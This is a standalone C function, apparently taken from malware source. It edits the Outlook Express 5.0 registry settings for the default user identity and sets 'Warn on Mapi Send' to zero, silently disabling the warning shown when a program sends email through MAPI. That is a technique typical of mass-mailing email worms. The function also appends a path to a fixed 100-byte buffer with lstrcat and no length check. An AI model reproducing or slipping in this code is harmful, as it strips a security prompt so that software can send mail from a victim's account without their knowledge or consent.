   bool DisableMapiWarning(void)
   {
       HKEY            RegHandle1;
       HKEY            RegHandle2;
       char            DefaultUserId[100];
       DWORD           DefaultUserSize = sizeof(DefaultUserId);
       DWORD           WarnDisable = 0;

       if(RegOpenKeyEx(HKEY_CURRENT_USER, "Identities", 0, KEY_QUERY_VALUE, &RegHandle1) == ERROR_SUCCESS)
       {
           if(RegQueryValueEx(RegHandle1, "Default User ID", 0, 0, (BYTE *)&DefaultUserId, &DefaultUserSize) == ERROR_SUCCESS)
           {
               if(lstrcat(DefaultUserId, "\\Software\\Microsoft\\Outlook Express\\5.0\\Mail") != 0)
               {
                   if(RegOpenKeyEx(RegHandle1, DefaultUserId, 0, KEY_SET_VALUE, &RegHandle2) == ERROR_SUCCESS)
                   {
                       RegSetValueEx(RegHandle2, "Warn on Mapi Send", 0, REG_DWORD, (BYTE *)&WarnDisable, sizeof(WarnDisable));

                       RegCloseKey(RegHandle2);
                       RegCloseKey(RegHandle1);

                       return true;
                   }
               }
           }

           RegCloseKey(RegHandle1);
       }

       return false;
   }
